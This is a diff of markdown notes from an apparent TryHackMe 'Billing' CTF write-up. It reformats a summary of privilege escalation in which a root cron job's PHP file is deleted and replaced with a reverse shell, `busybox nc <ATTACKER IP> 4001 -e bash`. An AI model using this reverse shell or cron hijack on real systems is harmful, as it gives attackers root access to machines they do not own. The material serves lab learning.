@@ -61,18 +61,19 @@ From what I understand, since user can run fail2ban-client with sudo, use it’s
 
 I still looked up some other write-ups to see if there were alternate ways of doing this and found:
 https://domoon.medium.com/billing-thm-writeup-de780e9f8017
-used ‘pspy64’ to see running processes and found a cron job running as root every minute. Had access to delete and recreate the file to get root
-Cron runs this:
+
+used ‘pspy64’ to see running processes and found a cron job running as root every minute. Had access to delete and recreate the file to get root.
+* Cron runs this:
   sh -c php /var/www/html/mbilling/cron.php ..
-viewed this: /var/www/html/mbilling/cron.php
-cannot write to the file but own directory
-give yourself permission to write to directory: 
+* viewed this: /var/www/html/mbilling/cron.php
+* cannot write to the file but own directory
+* give yourself permission to write to directory: 
   chmod +w /var/www/html/mbilling
-Can’t write to cron.php, but can delete the file and create a new one
-Wrote it with a PHP rev shell
+* Can’t write to cron.php, but can delete the file and create a new one
+* Wrote it with a PHP rev shell
   <?php
   exec("busybox nc <ATTACKER IP> 4001 -e bash");
   ?>
-start netcat listener, Cron runs, user gets root
+* start netcat listener, Cron runs, user gets root
 
 
